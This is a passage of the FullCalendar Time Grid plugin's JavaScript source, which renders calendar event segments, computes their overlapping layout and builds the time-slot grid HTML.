/*!
FullCalendar Time Grid Plugin v4.4.2
Docs & License: https://fullcalendar.io/
(c) 2019 Adam Shaw
*/

import { createFormatter, removeElement, computeEventDraggable, computeEventStartResizable, computeEventEndResizable, cssToStr, isMultiDayRange, htmlEscape, compareByFieldSpecs, applyStyle, FgEventRenderer, buildSegCompareObj, FillRenderer, memoize, memoizeRendering, createDuration, wholeDivideDurations, findElements, PositionCache, startOfDay, asRoughMs, formatIsoTimeString, addDurations, htmlToElement, createElement, multiplyDuration, DateComponent, hasBgRendering, Splitter, diffDays, buildGotoAnchorHtml, getAllDayHtml, ScrollComponent, matchCellWidths, uncompensateScroll, compensateScroll, subtractInnerElHeight, View, intersectRanges, Slicer, DayHeader, DaySeries, DayTable, createPlugin } from '@fullcalendar/core';
import { DayBgRow, DayGrid, SimpleDayGrid } from '@fullcalendar/daygrid';

/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */
/* global Reflect, Promise */

var extendStatics = function(d, b) {
    extendStatics = Object.setPrototypeOf ||
        ({ __proto__: [] } instanceof Array && function (d, b) { d.__proto__ = b; }) ||
        function (d, b) { for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; };
    return extendStatics(d, b);
};

function __extends(d, b) {
    extendStatics(d, b);
    function __() { this.constructor = d; }
    d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());
}

var __assign = function() {
    __assign = Object.assign || function __assign(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p)) t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};

/*
Only handles foreground segs.
Does not own rendering. Use for low-level util methods by TimeGrid.
*/
var TimeGridEventRenderer = /** @class */ (function (_super) {
    __extends(TimeGridEventRenderer, _super);
    function TimeGridEventRenderer(timeGrid) {
        var _this = _super.call(this) || this;
        _this.timeGrid = timeGrid;
        return _this;
    }
    TimeGridEventRenderer.prototype.renderSegs = function (context, segs, mirrorInfo) {
        _super.prototype.renderSegs.call(this, context, segs, mirrorInfo);
        // TODO: dont do every time. memoize
        this.fullTimeFormat = createFormatter({
            hour: 'numeric',
            minute: '2-digit',
            separator: this.context.options.defaultRangeSeparator
        });
    };
    // Given an array of foreground segments, render a DOM element for each, computes position,
    // and attaches to the column inner-container elements.
    TimeGridEventRenderer.prototype.attachSegs = function (segs, mirrorInfo) {
        var segsByCol = this.timeGrid.groupSegsByCol(segs);
        // order the segs within each column
        // TODO: have groupSegsByCol do this?
        for (var col = 0; col < segsByCol.length; col++) {
            segsByCol[col] = this.sortEventSegs(segsByCol[col]);
        }
        this.segsByCol = segsByCol;
        this.timeGrid.attachSegsByCol(segsByCol, this.timeGrid.fgContainerEls);
    };
    TimeGridEventRenderer.prototype.detachSegs = function (segs) {
        segs.forEach(function (seg) {
            removeElement(seg.el);
        });
        this.segsByCol = null;
    };
    TimeGridEventRenderer.prototype.computeSegSizes = function (allSegs) {
        var _a = this, timeGrid = _a.timeGrid, segsByCol = _a.segsByCol;
        var colCnt = timeGrid.colCnt;
        timeGrid.computeSegVerticals(allSegs); // horizontals relies on this
        if (segsByCol) {
            for (var col = 0; col < colCnt; col++) {
                this.computeSegHorizontals(segsByCol[col]); // compute horizontal coordinates, z-index's, and reorder the array
            }
        }
    };
    TimeGridEventRenderer.prototype.assignSegSizes = function (allSegs) {
        var _a = this, timeGrid = _a.timeGrid, segsByCol = _a.segsByCol;
        var colCnt = timeGrid.colCnt;
        timeGrid.assignSegVerticals(allSegs); // horizontals relies on this
        if (segsByCol) {
            for (var col = 0; col < colCnt; col++) {
                this.assignSegCss(segsByCol[col]);
            }
        }
    };
    // Computes a default event time formatting string if `eventTimeFormat` is not explicitly defined
    TimeGridEventRenderer.prototype.computeEventTimeFormat = function () {
        return {
            hour: 'numeric',
            minute: '2-digit',
            meridiem: false
        };
    };
    // Computes a default `displayEventEnd` value if one is not expliclty defined
    TimeGridEventRenderer.prototype.computeDisplayEventEnd = function () {
        return true;
    };
    // Renders the HTML for a single event segment's default rendering
    TimeGridEventRenderer.prototype.renderSegHtml = function (seg, mirrorInfo) {
        var eventRange = seg.eventRange;
        var eventDef = eventRange.def;
        var eventUi = eventRange.ui;
        var allDay = eventDef.allDay;
        var isDraggable = computeEventDraggable(this.context, eventDef, eventUi);
        var isResizableFromStart = seg.isStart && computeEventStartResizable(this.context, eventDef, eventUi);
        var isResizableFromEnd = seg.isEnd && computeEventEndResizable(this.context, eventDef, eventUi);
        var classes = this.getSegClasses(seg, isDraggable, isResizableFromStart || isResizableFromEnd, mirrorInfo);
        var skinCss = cssToStr(this.getSkinCss(eventUi));
        var timeText;
        var fullTimeText; // more verbose time text. for the print stylesheet
        var startTimeText; // just the start time text
        classes.unshift('fc-time-grid-event');
        // if the event appears to span more than one day...
        if (isMultiDayRange(eventRange.range)) {
            // Don't display time text on segments that run entirely through a day.
            // That would appear as midnight-midnight and would look dumb.
            // Otherwise, display the time text for the *segment's* times (like 6pm-midnight or midnight-10am)
            if (seg.isStart || seg.isEnd) {
                var unzonedStart = seg.start;
                var unzonedEnd = seg.end;
                timeText = this._getTimeText(unzonedStart, unzonedEnd, allDay); // TODO: give the timezones
                fullTimeText = this._getTimeText(unzonedStart, unzonedEnd, allDay, this.fullTimeFormat);
                startTimeText = this._getTimeText(unzonedStart, unzonedEnd, allDay, null, false); // displayEnd=false
            }
        }
        else {
            // Display the normal time text for the *event's* times
            timeText = this.getTimeText(eventRange);
            fullTimeText = this.getTimeText(eventRange, this.fullTimeFormat);
            startTimeText = this.getTimeText(eventRange, null, false); // displayEnd=false
        }
        return '<a class="' + classes.join(' ') + '"' +
            (eventDef.url ?
                ' href="' + htmlEscape(eventDef.url) + '"' :
                '') +
            (skinCss ?
                ' style="' + skinCss + '"' :
                '') +
            '>' +
            '<div class="fc-content">' +
            (timeText ?
                '<div class="fc-time"' +
                    ' data-start="' + htmlEscape(startTimeText) + '"' +
                    ' data-full="' + htmlEscape(fullTimeText) + '"' +
                    '>' +
                    '<span>' + htmlEscape(timeText) + '</span>' +
                    '</div>' :
                '') +
            (eventDef.title ?
                '<div class="fc-title">' +
                    htmlEscape(eventDef.title) +
                    '</div>' :
                '') +
            '</div>' +
            /* TODO: write CSS for this
            (isResizableFromStart ?
              '<div class="fc-resizer fc-start-resizer"></div>' :
              ''
              ) +
            */
            (isResizableFromEnd ?
                '<div class="fc-resizer fc-end-resizer"></div>' :
                '') +
            '</a>';
    };
    // Given an array of segments that are all in the same column, sets the backwardCoord and forwardCoord on each.
    // Assumed the segs are already ordered.
    // NOTE: Also reorders the given array by date!
    TimeGridEventRenderer.prototype.computeSegHorizontals = function (segs) {
        var levels;
        var level0;
        var i;
        levels = buildSlotSegLevels(segs);
        computeForwardSlotSegs(levels);
        if ((level0 = levels[0])) {
            for (i = 0; i < level0.length; i++) {
                computeSlotSegPressures(level0[i]);
            }
            for (i = 0; i < level0.length; i++) {
                this.computeSegForwardBack(level0[i], 0, 0);
            }
        }
    };
    // Calculate seg.forwardCoord and seg.backwardCoord for the segment, where both values range
    // from 0 to 1. If the calendar is left-to-right, the seg.backwardCoord maps to "left" and
    // seg.forwardCoord maps to "right" (via percentage). Vice-versa if the calendar is right-to-left.
    //
    // The segment might be part of a "series", which means consecutive segments with the same pressure
    // who's width is unknown until an edge has been hit. `seriesBackwardPressure` is the number of
    // segments behind this one in the current series, and `seriesBackwardCoord` is the starting
    // coordinate of the first segment in the series.
    TimeGridEventRenderer.prototype.computeSegForwardBack = function (seg, seriesBackwardPressure, seriesBackwardCoord) {
        var forwardSegs = seg.forwardSegs;
        var i;
        if (seg.forwardCoord === undefined) { // not already computed
            if (!forwardSegs.length) {
                // if there are no forward segments, this segment should butt up against the edge
                seg.forwardCoord = 1;
            }
            else {
                // sort highest pressure first
                this.sortForwardSegs(forwardSegs);
                // this segment's forwardCoord will be calculated from the backwardCoord of the
                // highest-pressure forward segment.
                this.computeSegForwardBack(forwardSegs[0], seriesBackwardPressure + 1, seriesBackwardCoord);
                seg.forwardCoord = forwardSegs[0].backwardCoord;
            }
            // calculate the backwardCoord from the forwardCoord. consider the series
            seg.backwardCoord = seg.forwardCoord -
                (seg.forwardCoord - seriesBackwardCoord) / // available width for series
                    (seriesBackwardPressure + 1); // # of segments in the series
            // use this segment's coordinates to computed the coordinates of the less-pressurized
            // forward segments
            for (i = 0; i < forwardSegs.length; i++) {
                this.computeSegForwardBack(forwardSegs[i], 0, seg.forwardCoord);
            }
        }
    };
    TimeGridEventRenderer.prototype.sortForwardSegs = function (forwardSegs) {
        var objs = forwardSegs.map(buildTimeGridSegCompareObj);
        var specs = [
            // put higher-pressure first
            { field: 'forwardPressure', order: -1 },
            // put segments that are closer to initial edge first (and favor ones with no coords yet)
            { field: 'backwardCoord', order: 1 }
        ].concat(this.context.eventOrderSpecs);
        objs.sort(function (obj0, obj1) {
            return compareByFieldSpecs(obj0, obj1, specs);
        });
        return objs.map(function (c) {
            return c._seg;
        });
    };
    // Given foreground event segments that have already had their position coordinates computed,
    // assigns position-related CSS values to their elements.
    TimeGridEventRenderer.prototype.assignSegCss = function (segs) {
        for (var _i = 0, segs_1 = segs; _i < segs_1.length; _i++) {
            var seg = segs_1[_i];
            applyStyle(seg.el, this.generateSegCss(seg));
            if (seg.level > 0) {
                seg.el.classList.add('fc-time-grid-event-inset');
            }
            // if the event is short that the title will be cut off,
            // attach a className that condenses the title into the time area.
            if (seg.eventRange.def.title && seg.bottom - seg.top < 30) {
                seg.el.classList.add('fc-short'); // TODO: "condensed" is a better name
            }
        }
    };
    // Generates an object with CSS properties/values that should be applied to an event segment element.
    // Contains important positioning-related properties that should be applied to any event element, customized or not.
    TimeGridEventRenderer.prototype.generateSegCss = function (seg) {
        var shouldOverlap = this.context.options.slotEventOverlap;
        var backwardCoord = seg.backwardCoord; // the left side if LTR. the right side if RTL. floating-point
        var forwardCoord = seg.forwardCoord; // the right side if LTR. the left side if RTL. floating-point
        var props = this.timeGrid.generateSegVerticalCss(seg); // get top/bottom first
        var isRtl = this.context.isRtl;
        var left; // amount of space from left edge, a fraction of the total width
        var right; // amount of space from right edge, a fraction of the total width
        if (shouldOverlap) {
            // double the width, but don't go beyond the maximum forward coordinate (1.0)
            forwardCoord = Math.min(1, backwardCoord + (forwardCoord - backwardCoord) * 2);
        }
        if (isRtl) {
            left = 1 - forwardCoord;
            right = backwardCoord;
        }
        else {
            left = backwardCoord;
            right = 1 - forwardCoord;
        }
        props.zIndex = seg.level + 1; // convert from 0-base to 1-based
        props.left = left * 100 + '%';
        props.right = right * 100 + '%';
        if (shouldOverlap && seg.forwardPressure) {
            // add padding to the edge so that forward stacked events don't cover the resizer's icon
            props[isRtl ? 'marginLeft' : 'marginRight'] = 10 * 2; // 10 is a guesstimate of the icon's width
        }
        return props;
    };
    return TimeGridEventRenderer;
}(FgEventRenderer));
// Builds an array of segments "levels". The first level will be the leftmost tier of segments if the calendar is
// left-to-right, or the rightmost if the calendar is right-to-left. Assumes the segments are already ordered by date.
function buildSlotSegLevels(segs) {
    var levels = [];
    var i;
    var seg;
    var j;
    for (i = 0; i < segs.length; i++) {
        seg = segs[i];
        // go through all the levels and stop on the first level where there are no collisions
        for (j = 0; j < levels.length; j++) {
            if (!computeSlotSegCollisions(seg, levels[j]).length) {
                break;
            }
        }
        seg.level = j;
        (levels[j] || (levels[j] = [])).push(seg);
    }
    return levels;
}
// For every segment, figure out the other segments that are in subsequent
// levels that also occupy the same vertical space. Accumulate in seg.forwardSegs
function computeForwardSlotSegs(levels) {
    var i;
    var level;
    var j;
    var seg;
    var k;
    for (i = 0; i < levels.length; i++) {
        level = levels[i];
        for (j = 0; j < level.length; j++) {
            seg = level[j];
            seg.forwardSegs = [];
            for (k = i + 1; k < levels.length; k++) {
                computeSlotSegCollisions(seg, levels[k], seg.forwardSegs);
            }
        }
    }
}
// Figure out which path forward (via seg.forwardSegs) results in the longest path until
// the furthest edge is reached. The number of segments in this path will be seg.forwardPressure
function computeSlotSegPressures(seg) {
    var forwardSegs = seg.forwardSegs;
    var forwardPressure = 0;
    var i;
    var forwardSeg;
    if (seg.forwardPressure === undefined) { // not already computed
        for (i = 0; i < forwardSegs.length; i++) {
            forwardSeg = forwardSegs[i];
            // figure out the child's maximum forward path
            computeSlotSegPressures(forwardSeg);
            // either use the existing maximum, or use the child's forward pressure
            // plus one (for the forwardSeg itself)
            forwardPressure = Math.max(forwardPressure, 1 + forwardSeg.forwardPressure);
        }
        seg.forwardPressure = forwardPressure;
    }
}
// Find all the segments in `otherSegs` that vertically collide with `seg`.
// Append into an optionally-supplied `results` array and return.
function computeSlotSegCollisions(seg, otherSegs, results) {
    if (results === void 0) { results = []; }
    for (var i = 0; i < otherSegs.length; i++) {
        if (isSlotSegCollision(seg, otherSegs[i])) {
            results.push(otherSegs[i]);
        }
    }
    return results;
}
// Do these segments occupy the same vertical space?
function isSlotSegCollision(seg1, seg2) {
    return seg1.bottom > seg2.top && seg1.top < seg2.bottom;
}
function buildTimeGridSegCompareObj(seg) {
    var obj = buildSegCompareObj(seg);
    obj.forwardPressure = seg.forwardPressure;
    obj.backwardCoord = seg.backwardCoord;
    return obj;
}

var TimeGridMirrorRenderer = /** @class */ (function (_super) {
    __extends(TimeGridMirrorRenderer, _super);
    function TimeGridMirrorRenderer() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    TimeGridMirrorRenderer.prototype.attachSegs = function (segs, mirrorInfo) {
        this.segsByCol = this.timeGrid.groupSegsByCol(segs);
        this.timeGrid.attachSegsByCol(this.segsByCol, this.timeGrid.mirrorContainerEls);
        this.sourceSeg = mirrorInfo.sourceSeg;
    };
    TimeGridMirrorRenderer.prototype.generateSegCss = function (seg) {
        var props = _super.prototype.generateSegCss.call(this, seg);
        var sourceSeg = this.sourceSeg;
        if (sourceSeg && sourceSeg.col === seg.col) {
            var sourceSegProps = _super.prototype.generateSegCss.call(this, sourceSeg);
            props.left = sourceSegProps.left;
            props.right = sourceSegProps.right;
            props.marginLeft = sourceSegProps.marginLeft;
            props.marginRight = sourceSegProps.marginRight;
        }
        return props;
    };
    return TimeGridMirrorRenderer;
}(TimeGridEventRenderer));

var TimeGridFillRenderer = /** @class */ (function (_super) {
    __extends(TimeGridFillRenderer, _super);
    function TimeGridFillRenderer(timeGrid) {
        var _this = _super.call(this) || this;
        _this.timeGrid = timeGrid;
        return _this;
    }
    TimeGridFillRenderer.prototype.attachSegs = function (type, segs) {
        var timeGrid = this.timeGrid;
        var containerEls;
        // TODO: more efficient lookup
        if (type === 'bgEvent') {
            containerEls = timeGrid.bgContainerEls;
        }
        else if (type === 'businessHours') {
            containerEls = timeGrid.businessContainerEls;
        }
        else if (type === 'highlight') {
            containerEls = timeGrid.highlightContainerEls;
        }
        timeGrid.attachSegsByCol(timeGrid.groupSegsByCol(segs), containerEls);
        return segs.map(function (seg) {
            return seg.el;
        });
    };
    TimeGridFillRenderer.prototype.computeSegSizes = function (segs) {
        this.timeGrid.computeSegVerticals(segs);
    };
    TimeGridFillRenderer.prototype.assignSegSizes = function (segs) {
        this.timeGrid.assignSegVerticals(segs);
    };
    return TimeGridFillRenderer;
}(FillRenderer));

/* A component that renders one or more columns of vertical time slots
----------------------------------------------------------------------------------------------------------------------*/
// potential nice values for the slot-duration and interval-duration
// from largest to smallest
var AGENDA_STOCK_SUB_DURATIONS = [
    { hours: 1 },
    { minutes: 30 },
    { minutes: 15 },
    { seconds: 30 },
    { seconds: 15 }
];
var TimeGrid = /** @class */ (function (_super) {
    __extends(TimeGrid, _super);
    function TimeGrid(el, renderProps) {
        var _this = _super.call(this, el) || this;
        _this.isSlatSizesDirty = false;
        _this.isColSizesDirty = false;
        _this.processOptions = memoize(_this._processOptions);
        _this.renderSkeleton = memoizeRendering(_this._renderSkeleton);
        _this.renderSlats = memoizeRendering(_this._renderSlats, null, [_this.renderSkeleton]);
        _this.renderColumns = memoizeRendering(_this._renderColumns, _this._unrenderColumns, [_this.renderSkeleton]);
        _this.renderProps = renderProps;
        var renderColumns = _this.renderColumns;
        var eventRenderer = _this.eventRenderer = new TimeGridEventRenderer(_this);
        var fillRenderer = _this.fillRenderer = new TimeGridFillRenderer(_this);
        _this.mirrorRenderer = new TimeGridMirrorRenderer(_this);
        _this.renderBusinessHours = memoizeRendering(fillRenderer.renderSegs.bind(fillRenderer, 'businessHours'), fillRenderer.unrender.bind(fillRenderer, 'businessHours'), [renderColumns]);
        _this.renderDateSelection = memoizeRendering(_this._renderDateSelection, _this._unrenderDateSelection, [renderColumns]);
        _this.renderFgEvents = memoizeRendering(eventRenderer.renderSegs.bind(eventRenderer), eventRenderer.unrender.bind(eventRenderer), [renderColumns]);
        _this.renderBgEvents = memoizeRendering(fillRenderer.renderSegs.bind(fillRenderer, 'bgEvent'), fillRenderer.unrender.bind(fillRenderer, 'bgEvent'), [renderColumns]);
        _this.renderEventSelection = memoizeRendering(eventRenderer.selectByInstanceId.bind(eventRenderer), eventRenderer.unselectByInstanceId.bind(eventRenderer), [_this.renderFgEvents]);
        _this.renderEventDrag = memoizeRendering(_this._renderEventDrag, _this._unrenderEventDrag, [renderColumns]);
        _this.renderEventResize = memoizeRendering(_this._renderEventResize, _this._unrenderEventResize, [renderColumns]);
        return _this;
    }
    /* Options
    ------------------------------------------------------------------------------------------------------------------*/
    // Parses various options into properties of this object
    // MUST have context already set
    TimeGrid.prototype._processOptions = function (options) {
        var slotDuration = options.slotDuration, snapDuration = options.snapDuration;
        var snapsPerSlot;
        var input;
        slotDuration = createDuration(slotDuration);
        snapDuration = snapDuration ? createDuration(snapDuration) : slotDuration;
        snapsPerSlot = wholeDivideDurations(slotDuration, snapDuration);
        if (snapsPerSlot === null) {
            snapDuration = slotDuration;
            snapsPerSlot = 1;
            // TODO: say warning?
        }
        this.slotDuration = slotDuration;
        this.snapDuration = snapDuration;
        this.snapsPerSlot = snapsPerSlot;
        // might be an array value (for TimelineView).
        // if so, getting the most granular entry (the last one probably).
        input = options.slotLabelFormat;
        if (Array.isArray(input)) {
            input = input[input.length - 1];
        }
        this.labelFormat = createFormatter(input || {
            hour: 'numeric',
            minute: '2-digit',
            omitZeroMinute: true,
            meridiem: 'short'
        });
        input = options.slotLabelInterval;
        this.labelInterval = input ?
            createDuration(input) :
            this.computeLabelInterval(slotDuration);
    };
    // Computes an automatic value for slotLabelInterval
    TimeGrid.prototype.computeLabelInterval = function (slotDuration) {
        var i;
        var labelInterval;
        var slotsPerLabel;
        // find the smallest stock label interval that results in more than one slots-per-label
        for (i = AGENDA_STOCK_SUB_DURATIONS.length - 1; i >= 0; i--) {
            labelInterval = createDuration(AGENDA_STOCK_SUB_DURATIONS[i]);
            slotsPerLabel = wholeDivideDurations(labelInterval, slotDuration);
            if (slotsPerLabel !== null && slotsPerLabel > 1) {
                return labelInterval;
            }
        }
        return slotDuration; // fall back
    };
    /* Rendering
    ------------------------------------------------------------------------------------------------------------------*/
    TimeGrid.prototype.render = function (props, context) {
        this.processOptions(context.options);
        var cells = props.cells;
        this.colCnt = cells.length;
        this.renderSkeleton(context.theme);
        this.renderSlats(props.dateProfile);
        this.renderColumns(props.cells, props.dateProfile);
        this.renderBusinessHours(context, props.businessHourSegs);
        this.renderDateSelection(props.dateSelectionSegs);
        this.renderFgEvents(context, props.fgEventSegs);
        this.renderBgEvents(context, props.bgEventSegs);
        this.renderEventSelection(props.eventSelection);
        this.renderEventDrag(props.eventDrag);
        this.renderEventResize(props.eventResize);
    };
    TimeGrid.prototype.destroy = function () {
        _super.prototype.destroy.call(this);
        // should unrender everything else too
        this.renderSlats.unrender();
        this.renderColumns.unrender();
        this.renderSkeleton.unrender();
    };
    TimeGrid.prototype.updateSize = function (isResize) {
        var _a = this, fillRenderer = _a.fillRenderer, eventRenderer = _a.eventRenderer, mirrorRenderer = _a.mirrorRenderer;
        if (isResize || this.isSlatSizesDirty) {
            this.buildSlatPositions();
            this.isSlatSizesDirty = false;
        }
        if (isResize || this.isColSizesDirty) {
            this.buildColPositions();
            this.isColSizesDirty = false;
        }
        fillRenderer.computeSizes(isResize);
        eventRenderer.computeSizes(isResize);
        mirrorRenderer.computeSizes(isResize);
        fillRenderer.assignSizes(isResize);
        eventRenderer.assignSizes(isResize);
        mirrorRenderer.assignSizes(isResize);
    };
    TimeGrid.prototype._renderSkeleton = function (theme) {
        var el = this.el;
        el.innerHTML =
            '<div class="fc-bg"></div>' +
                '<div class="fc-slats"></div>' +
                '<hr class="fc-divider ' + theme.getClass('widgetHeader') + '" style="display:none" />';
        this.rootBgContainerEl = el.querySelector('.fc-bg');
        this.slatContainerEl = el.querySelector('.fc-slats');
        this.bottomRuleEl = el.querySelector('.fc-divider');
    };
    TimeGrid.prototype._renderSlats = function (dateProfile) {
        var theme = this.context.theme;
        this.slatContainerEl.innerHTML =
            '<table class="' + theme.getClass('tableGrid') + '">' +
                this.renderSlatRowHtml(dateProfile) +
                '</table>';
        this.slatEls = findElements(this.slatContainerEl, 'tr');
        this.slatPositions = new PositionCache(this.el, this.slatEls, false, true // vertical
        );
        this.isSlatSizesDirty = true;
    };
    // Generates the HTML for the horizontal "slats" that run width-wise. Has a time axis on a side. Depends on RTL.
    TimeGrid.prototype.renderSlatRowHtml = function (dateProfile) {
        var _a = this.context, dateEnv = _a.dateEnv, theme = _a.theme, isRtl = _a.isRtl;
        var html = '';
        var dayStart = startOfDay(dateProfile.renderRange.start);
        var slotTime = dateProfile.minTime;
        var slotIterator = createDuration(0);
        var slotDate; // will be on the view's first day, but we only care about its time
        var isLabeled;
        var axisHtml;
        // Calculate the time for each slot
        while (asRoughMs(slotTime) < asRoughMs(dateProfile.maxTime)) {
            slotDate = dateEnv.add(dayStart, slotTime);
            isLabeled = wholeDivideDurations(slotIterator, this.labelInterval) !== null;
            axisHtml =
                '<td class="fc-axis fc-time ' + theme.getClass('widgetContent') + '">' +
                    (isLabeled ?
                        '<span>' + // for matchCellWidths
                            htmlEscape(dateEnv.format(slotDate, this.labelFormat)) +
                            '</span>' :
                        '') +
                    '</td>';
            html +=
                '<tr data-time="' + formatIsoTimeString(slotDate) + '"' +
                    (isLabeled ? '' : ' class="fc-minor"') +
                    '>' +
                    (!isRtl ? axisHtml : '') +
                    '<td class="' + theme.getClass('widgetContent') + '"></td>' +
                    (isRtl ? axisHtml : '') +
                    '</tr>';
            slotTime = addDurations(slotTime, this.slotDuration);
            slotIterator = addDurations(slotIterator, this.slotDuration);
        }
        return html;
    };
    TimeGrid.prototype._renderColumns = function (cells, dateProfile) {
        var _a = this.context, calendar = _a.calendar, view = _a.view, isRtl = _a.isRtl, theme = _a.theme, dateEnv = _a.dateEnv;
        var bgRow = new DayBgRow(this.context);
        this.rootBgContainerEl.innerHTML =
            '<table class="' + theme.getClass('tableGrid') + '">' +
                bgRow.renderHtml({
                    cells: cells,
                    dateProfile: dateProfile,
                    renderIntroHtml: this.renderProps.renderBgIntroHtml
                }) +
                '</table>';
        this.colEls = findElements(this.el, '.fc-day, .fc-disabled-day');
        for (var col = 0; col < this.colCnt; col++) {
            calendar.publiclyTrigger('dayRender', [
                {
                    date: dateEnv.toDate(cells[col].date),
                    el: this.colEls[col],
                    view: view
                }
            ]);
        }
        if (isRtl) {
            this.colEls.reverse();
        }
        this.colPositions = new PositionCache(this.el, this.colEls, true, // horizontal
        false);
        this.renderContentSkeleton();
        this.isColSizesDirty = true;
    };
    TimeGrid.prototype._unrenderColumns = function () {
        this.unrenderContentSkeleton();
    };
    /* Content Skeleton
    ------------------------------------------------------------------------------------------------------------------*/
    // Renders the DOM that the view's content will live in
    TimeGrid.prototype.renderContentSkeleton = function () {
        var isRtl = this.context.isRtl;
        var parts = [];
        var skeletonEl;
        parts.push(this.renderProps.renderIntroHtml());
        for (var i = 0; i < this.colCnt; i++) {
            parts.push('<td>' +
                '<div class="fc-content-col">' +
                '<div class="fc-event-container fc-mirror-container"></div>' +
                '<div class="fc-event-container"></div>' +
                '<div class="fc-highlight-container"></div>' +
                '<div class="fc-bgevent-container"></div>' +
                '<div class="fc-business-container"></div>' +
                '</div>' +
                '</td>');
        }
        if (isRtl) {
            parts.reverse();
        }
        skeletonEl = this.contentSkeletonEl = htmlToElement('<div class="fc-content-skeleton">' +
            '<table>' +
            '<tr>' + parts.join('') + '</tr>' +
            '</table>' +
            '</div>');
        this.colContainerEls = findElements(skeletonEl, '.fc-content-col');
        this.mirrorContainerEls = findElements(skeletonEl, '.fc-mirror-container');
        this.fgContainerEls = findElements(skeletonEl, '.fc-event-container:not(.fc-mirror-container)');
        this.bgContainerEls = findElements(skeletonEl, '.fc-bgevent-container');
        this.highlightContainerEls = findElements(skeletonEl, '.fc-highlight-container');
        this.businessContainerEls = findElements(skeletonEl, '.fc-business-container');
        if (isRtl) {
            this.colContainerEls.reverse();
            this.mirrorContainerEls.reverse();
            this.fgContainerEls.reverse();
            this.bgContainerEls.reverse();
            this.highlightContainerEls.reverse();
            this.businessContainerEls.reverse();
        }
        this.el.appendChild(skeletonEl);
    };
    TimeGrid.prototype.unrenderContentSkeleton = function () {
        removeElement(this.contentSkeletonEl);
    };
    // Given a flat array of segments, return an array of sub-arrays, grouped by each segment's col
    TimeGrid.prototype.groupSegsByCol = function (segs) {
        var segsByCol = [];
        var i;
        for (i = 0; i < this.colCnt; i++) {
            segsByCol.push([]);
        }
        for (i = 0; i < segs.length; i++) {
            segsByCol[segs[i].col].push(segs[i]);
        }
        return segsByCol;
    };
    // Given segments grouped by column, insert the segments' elements into a parallel array of container
    // elements, each living within a column.
    TimeGrid.prototype.attachSegsByCol = function (segsByCol, containerEls) {
        var col;
        var segs;
        var i;
        for (col = 0; col < this.colCnt; col++) { // iterate each column grouping
            segs = segsByCol[col];
            for (i = 0; i < segs.length; i++) {
                containerEls[col].appendChild(segs[i].el);
            }
        }
    };
    /* Now Indicator
    ------------------------------------------------------------------------------------------------------------------*/
    TimeGrid.prototype.getNowIndicatorUnit = function () {
        return 'minute'; // will refresh on the minute
    };
    TimeGrid.prototype.renderNowIndicator = function (segs, date) {
        // HACK: if date columns not ready for some reason (scheduler)
        if (!this.colContainerEls) {
            return;
        }
        var top = this.computeDateTop(date);
        var nodes = [];
        var i;
        // render lines within the columns
        for (i = 0; i < segs.length; i++) {
            var lineEl = createElement('div', { className: 'fc-now-indicator fc-now-indicator-line' });
            lineEl.style.top = top + 'px';
            this.colContainerEls[segs[i].col].appendChild(lineEl);
            nodes.push(lineEl);
        }
        // render an arrow over the axis
        if (segs.length > 0) { // is the current time in view?
            var arrowEl = createElement('div', { className: 'fc-now-indicator fc-now-indicator-arrow' });
            arrowEl.style.top = top + 'px';
            this.contentSkeletonEl.appendChild(arrowEl);
            nodes.push(arrowEl);
        }
        this.nowIndicatorEls = nodes;
    };
    TimeGrid.prototype.unrenderNowIndicator = function () {
        if (this.nowIndicatorEls) {
            this.nowIndicatorEls.forEach(removeElement);
            this.nowIndicatorEls = null;
        }
    };
    /* Coordinates
    ------------------------------------------------------------------------------------------------------------------*/
    TimeGrid.prototype.getTotalSlatHeight = function () {
        return this.slatContainerEl.getBoundingClientRect().height;
    };
    // Computes the top coordinate, relative to the bounds of the grid, of the given date.
    // A `startOfDayDate` must be given for avoiding ambiguity over how to treat midnight.
    TimeGrid.prototype.computeDateTop = function (when, startOfDayDate) {
        if (!startOfDayDate) {
            startOfDayDate = startOfDay(when);
        }
        return this.computeTimeTop(createDuration(when.valueOf() - startOfDayDate.valueOf()));
    };
    // Computes the top coordinate, relative to the bounds of the grid, of the given time (a Duration).
    TimeGrid.prototype.computeTimeTop = function (duration) {
        var len = this.slatEls.length;
        var dateProfile = this.props.dateProfile;
        var slatCoverage = (duration.milliseconds - asRoughMs(dateProfile.minTime)) / asRoughMs(this.slotDuration); // floating-point value of # of slots covered
        var slatIndex;
        var slatRemainder;
        // compute a floating-point number for how many slats should be progressed through.
        // from 0 to number of slats (inclusive)
        // constrained because minTime/maxTime might be customized.
        slatCoverage = Math.max(0, slatCoverage);
        slatCoverage = Math.min(len, slatCoverage);
        // an integer index of the furthest whole slat
        // from 0 to number slats (*exclusive*, so len-1)
        slatIndex = Math.floor(slatCoverage);
        slatIndex = Math.min(slatIndex, len - 1);
        // how much further through the slatIndex slat (from 0.0-1.0) must be covered in addition.
        // could be 1.0 if slatCoverage is covering *all* the slots
        slatRemainder = slatCoverage - slatIndex;
        return this.slatPositions.tops[slatIndex] +
            this.slatPositions.getHeight(slatIndex) * slatRemainder;
    };
    // For each segment in an array, computes and assigns its top and bottom properties
    TimeGrid.prototype.computeSegVerticals = function (segs) {
        var options = this.context.options;
        var eventMinHeight = options.timeGridEventMinHeight;
        var i;
        var seg;
        var dayDate;
        for (i = 0; i < segs.length; i++) {
            seg = segs[i];
            dayDate = this.props.cells[seg.col].date;
            seg.top = this.computeDateTop(seg.start, dayDate);
